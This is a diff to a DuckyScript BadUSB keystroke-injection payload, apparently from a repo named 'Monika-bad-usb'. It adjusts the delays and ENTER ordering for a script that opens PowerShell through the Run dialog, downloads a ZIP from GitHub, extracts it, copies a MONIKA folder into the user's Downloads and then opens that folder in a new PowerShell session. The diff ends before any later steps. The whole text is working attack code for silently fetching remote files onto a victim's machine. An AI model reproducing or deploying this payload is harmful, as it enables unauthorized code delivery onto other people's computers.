@@ -1,9 +1,9 @@
 GUI r
 DELAY 5000
 STRING powershell
-DELAY 2500
-ENTER
 DELAY 250
+ENTER
+DELAY 2500
 STRING $z="$env:TEMP\repo.zip"; $d="$env:TEMP\repo_extract"; Invoke-WebRequest "https://github.com/superhatemeworld666/Monika-bad-usb/archive/refs/heads/main.zip" -OutFile $z; Expand-Archive $z -DestinationPath $d -Force; Copy-Item "$d\Monika-bad-usb-main\MONIKA" "$env:USERPROFILE\Downloads\MONIKA" -Recurse -Force; Remove-Item $z,$d -Recurse -Force
 DELAY 100
 ENTER
@@ -15,6 +15,8 @@ DELAY 60000
 ALT F4
 GUI r
 STRING powershell
+DELAY 250
+ENTER
 DELAY 2500
 STRING cd "$env:USERPROFILE\Downloads\MONIKA"
 DELAY 250
